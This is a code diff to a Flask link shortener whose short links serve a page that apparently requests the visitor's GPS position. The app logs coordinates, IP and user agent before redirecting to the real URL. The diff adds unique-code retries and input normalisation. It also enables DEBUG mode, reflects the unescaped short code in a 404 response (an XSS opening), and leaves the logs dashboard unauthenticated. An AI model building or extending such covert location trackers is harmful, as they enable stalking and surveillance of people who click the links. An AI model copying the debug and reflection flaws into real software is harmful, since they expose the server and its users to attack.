@@ -1,8 +1,12 @@
 from flask import Flask, request, jsonify, render_template, redirect
 import sqlite3
 import uuid
+import logging
 
 app = Flask(__name__)
+app.config['DEBUG'] = True
+
+logging.basicConfig(level=logging.INFO)
 
 DB_NAME = 'database.db'
 
@@ -42,7 +46,7 @@ init_db()
 def home():
     return render_template('index.html')
 
-# Create short link
+# Create short link with better uniqueness
 @app.route('/api/shorten', methods=['POST'])
 def shorten():
     data = request.get_json()
@@ -50,27 +54,41 @@ def shorten():
     
     if not original_url:
         return jsonify({'error': 'URL is required'}), 400
-    
-    short_code = str(uuid.uuid4())[:8]
-    
+
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
-    c.execute('INSERT INTO links (id, original_url, short_code) VALUES (?, ?, ?)',
-              (str(uuid.uuid4()), original_url, short_code))
-    conn.commit()
-    conn.close()
     
-    short_url = f"{request.host_url.rstrip('/')}/{short_code}"
-    return jsonify({'short_url': short_url, 'short_code': short_code})
+    # Try up to 5 times to generate unique short code
+    for _ in range(5):
+        short_code = str(uuid.uuid4())[:8].lower()
+        
+        try:
+            c.execute('INSERT INTO links (id, original_url, short_code) VALUES (?, ?, ?)',
+                      (str(uuid.uuid4()), original_url, short_code))
+            conn.commit()
+            
+            short_url = f"{request.host_url.rstrip('/')}/{short_code}"
+            app.logger.info(f"Created short link: {short_code} -> {original_url}")
+            
+            conn.close()
+            return jsonify({'short_url': short_url, 'short_code': short_code})
+            
+        except sqlite3.IntegrityError:
+            continue  # Try again with new short_code
+    
+    conn.close()
+    return jsonify({'error': 'Failed to create unique short code'}), 500
 
-# Handle short link → Show tracking page (requests GPS)
+# Handle short link
 @app.route('/<short_code>')
 def track(short_code):
+    short_code = short_code.strip().lower()
     return render_template('track.html', short_code=short_code)
 
 # Receive GPS data
 @app.route('/api/track/<short_code>', methods=['POST'])
 def log_location(short_code):
+    short_code = short_code.strip().lower()
     data = request.get_json() or {}
     
     latitude = data.get('latitude')
@@ -83,6 +101,13 @@ def log_location(short_code):
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
     
+    # Check if link exists
+    c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
+    if not c.fetchone():
+        conn.close()
+        app.logger.error(f"Link not found: {short_code}")
+        return jsonify({'error': 'Link not found'}), 404
+    
     c.execute('''
         INSERT INTO logs (short_code, latitude, longitude, accuracy, ip, user_agent)
         VALUES (?, ?, ?, ?, ?, ?)
@@ -93,9 +118,11 @@ def log_location(short_code):
     
     return jsonify({'status': 'logged'})
 
-# Final redirect after logging
+# Final redirect
 @app.route('/redirect/<short_code>')
 def final_redirect(short_code):
+    short_code = short_code.strip().lower()
+    
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
     c.execute('SELECT original_url FROM links WHERE short_code = ?', (short_code,))
@@ -104,17 +131,16 @@ def final_redirect(short_code):
     
     if result:
         return redirect(result[0])
-    else:
-        return "Link not found", 404
+    return f"Link not found: {short_code}", 404
 
-# Logs Dashboard Page
+# Logs Dashboard
 @app.route('/logs/<short_code>')
 def logs_page(short_code):
-    return render_template('logs.html', short_code=short_code)
+    return render_template('logs.html', short_code=short_code.lower())
 
-# API to get logs
 @app.route('/api/logs/<short_code>')
 def get_logs(short_code):
+    short_code = short_code.strip().lower()
     conn = sqlite3.connect(DB_NAME)
     c = conn.cursor()
     c.execute('''
